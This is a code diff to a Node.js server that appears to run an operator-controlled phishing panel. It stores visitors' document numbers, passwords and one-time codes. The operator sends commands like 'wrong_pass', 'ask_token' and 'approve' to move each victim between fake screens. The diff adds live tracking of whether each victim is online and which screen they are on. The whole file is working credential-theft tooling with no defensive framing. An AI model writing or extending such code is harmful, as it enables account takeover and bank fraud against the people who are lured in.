@@ -124,6 +124,7 @@ function purgeDeletedSessions() {
 function getFilteredSessions() {
   loadStateFromDisk();
   purgeDeletedSessions();
+  const now = Date.now();
   return Array.from(sessions.values())
     .filter((s) => {
       return (
@@ -131,6 +132,14 @@ function getFilteredSessions() {
         (s.password && String(s.password).trim().length > 0) ||
         (s.token && String(s.token).trim().length > 0)
       );
+    })
+    .map((s) => {
+      const lastSeen = Number(s.lastSeenAtMs) || Number(s.updatedAtMs) || 0;
+      const isOnline = s.online !== false && now - lastSeen < 7000;
+      return {
+        ...s,
+        online: isOnline,
+      };
     })
     .sort((a, b) => (a.createdAtMs || 0) - (b.createdAtMs || 0));
 }
@@ -170,11 +179,16 @@ function upsertSession(data, meta = {}) {
       password: "",
       token: "",
       step: "doc",
-      status: "Esperando verificación por el operador",
+      screenLabel: "Pantalla: Contraseña",
+      status: "⏳ Esperando verificación por el operador",
+      waitingOperator: true,
+      online: true,
+      visibility: "active",
       pendingCommand: null,
       ackedCmdId: null,
       createdAtMs: nowMs,
       updatedAtMs: nowMs,
+      lastSeenAtMs: Date.now(),
       updatedAt: new Date().toLocaleTimeString(),
     };
   }
@@ -195,11 +209,18 @@ function upsertSession(data, meta = {}) {
     }
   }
   if (data.step) session.step = data.step;
+  if (data.screenLabel) session.screenLabel = data.screenLabel;
+  if (typeof data.waitingOperator === "boolean") session.waitingOperator = data.waitingOperator;
+  if (data.visibility) session.visibility = data.visibility;
   if (data.status) {
     session.status = data.status;
-    session.pendingCommand = null;
+    if (data.isUserSubmit) {
+      session.pendingCommand = null;
+    }
   }
-  session.connected = true;
+  session.online = data.online !== undefined ? Boolean(data.online) : true;
+  session.connected = session.online;
+  session.lastSeenAtMs = Date.now();
   session.updatedAtMs = nowMs;
   session.updatedAt = new Date().toLocaleTimeString();
 
@@ -208,6 +229,15 @@ function upsertSession(data, meta = {}) {
   broadcastSessions();
   return session;
 }
+
+const ACTION_LABELS = {
+  wrong_doc: "📤 Enviando error de documento...",
+  wrong_pass: "📤 Enviando error de clave...",
+  wrong_token: "📤 Enviando error de código...",
+  ask_pass: "📤 Enviando a pantalla de Clave...",
+  ask_token: "📤 Enviando a pantalla de Código...",
+  approve: "📤 Aprobando acceso al panel...",
+};
 
 function dispatchOperatorCommand({ targetId, action, message, cmdId: existingCmdId }) {
   loadStateFromDisk();
@@ -218,7 +248,8 @@ function dispatchOperatorCommand({ targetId, action, message, cmdId: existingCmd
   const payload = { cmdId, targetId, action, message, createdAtMs: nowMs };
   if (session) {
     session.lastAction = action;
-    session.status = `Operación enviada: ${action}`;
+    session.status = ACTION_LABELS[action] || `Operación enviada: ${action}`;
+    session.waitingOperator = false;
     session.pendingCommand = payload;
     session.updatedAtMs = nowMs;
     session.updatedAt = new Date().toLocaleTimeString();
@@ -295,20 +326,20 @@ app.post("/api/sync", (req, res) => {
           io.to(incoming.id).emit("operator:action", incoming.pendingCommand);
         }
       } else {
-        // Merge fields keeping newest data
         const exMs = Number(existing.updatedAtMs) || 0;
         if (inMs > exMs) {
           const keepSocketId = existing.socketId;
           const keepAcked = existing.ackedCmdId;
+          const keepLastSeen = Math.max(Number(existing.lastSeenAtMs) || 0, Number(incoming.lastSeenAtMs) || 0);
           Object.assign(existing, incoming);
           if (keepSocketId) existing.socketId = keepSocketId;
+          if (keepLastSeen) existing.lastSeenAtMs = keepLastSeen;
           if (keepAcked && existing.pendingCommand && existing.pendingCommand.cmdId === keepAcked) {
             existing.ackedCmdId = keepAcked;
             existing.pendingCommand = null;
           }
           sessions.set(incoming.id, existing);
         }
-        // Check if incoming has a newer unacknowledged pendingCommand
         if (
           incoming.pendingCommand &&
           incoming.pendingCommand.cmdId &&
@@ -342,11 +373,50 @@ app.post("/api/session", (req, res) => {
   res.json({ ok: true, session });
 });
 
-app.get("/api/session/:id/poll", (req, res) => {
+function handleClientPoll(req, res) {
   noCache(res);
   loadStateFromDisk();
   const session = sessions.get(req.params.id);
-  if (!session || !session.pendingCommand) {
+  if (!session) {
+    return res.json({ command: null });
+  }
+
+  const body = req.body || {};
+  let changed = false;
+  session.lastSeenAtMs = Date.now();
+  if (session.online === false) {
+    session.online = true;
+    changed = true;
+  }
+  if (body.visibility && body.visibility !== session.visibility) {
+    session.visibility = body.visibility;
+    changed = true;
+  }
+  if (body.step && body.step !== session.step) {
+    session.step = body.step;
+    changed = true;
+  }
+  if (body.screenLabel && body.screenLabel !== session.screenLabel) {
+    session.screenLabel = body.screenLabel;
+    changed = true;
+  }
+  if (typeof body.waitingOperator === "boolean" && body.waitingOperator !== session.waitingOperator) {
+    session.waitingOperator = body.waitingOperator;
+    changed = true;
+  }
+  if (body.status && !session.pendingCommand && body.status !== session.status) {
+    session.status = body.status;
+    changed = true;
+  }
+
+  if (changed) {
+    session.updatedAtMs = Math.max(Date.now(), (session.updatedAtMs || 0) + 1);
+    session.updatedAt = new Date().toLocaleTimeString();
+    saveStateToDisk();
+    broadcastSessions();
+  }
+
+  if (!session.pendingCommand) {
     return res.json({ command: null });
   }
   if (session.ackedCmdId === session.pendingCommand.cmdId) {
@@ -360,6 +430,24 @@ app.get("/api/session/:id/poll", (req, res) => {
   session.updatedAtMs = Math.max(Date.now(), (session.updatedAtMs || 0) + 1);
   saveStateToDisk();
   return res.json({ command });
+}
+
+app.get("/api/session/:id/poll", handleClientPoll);
+app.post("/api/session/:id/poll", handleClientPoll);
+
+app.post("/api/session/:id/offline", (req, res) => {
+  noCache(res);
+  loadStateFromDisk();
+  const session = sessions.get(req.params.id);
+  if (session) {
+    session.online = false;
+    session.connected = false;
+    session.updatedAtMs = Math.max(Date.now(), (session.updatedAtMs || 0) + 1);
+    session.updatedAt = new Date().toLocaleTimeString();
+    saveStateToDisk();
+    broadcastSessions();
+  }
+  res.json({ ok: true });
 });
 
 app.post("/api/command", (req, res) => {
@@ -393,12 +481,33 @@ io.on("connection", (socket) => {
       const session = sessions.get(clientId);
       if (session) {
         session.socketId = socket.id;
+        session.online = true;
         session.connected = true;
+        session.lastSeenAtMs = Date.now();
         if (session.pendingCommand && session.ackedCmdId !== session.pendingCommand.cmdId) {
           socket.emit("operator:action", session.pendingCommand);
         }
       }
     }
+  });
+
+  socket.on("client:activity", (data = {}) => {
+    const key = data.clientId || socket.id;
+    const session = sessions.get(key);
+    if (!session) return;
+    session.socketId = socket.id;
+    session.online = data.online !== undefined ? Boolean(data.online) : true;
+    session.lastSeenAtMs = Date.now();
+    if (data.visibility) session.visibility = data.visibility;
+    if (data.step) session.step = data.step;
+    if (data.screenLabel) session.screenLabel = data.screenLabel;
+    if (typeof data.waitingOperator === "boolean") session.waitingOperator = data.waitingOperator;
+    if (data.status && !session.pendingCommand) session.status = data.status;
+    session.updatedAtMs = Math.max(Date.now(), (session.updatedAtMs || 0) + 1);
+    session.updatedAt = new Date().toLocaleTimeString();
+    sessions.set(key, session);
+    saveStateToDisk();
+    broadcastSessions();
   });
 
   const handleClientData = (data = {}) => {
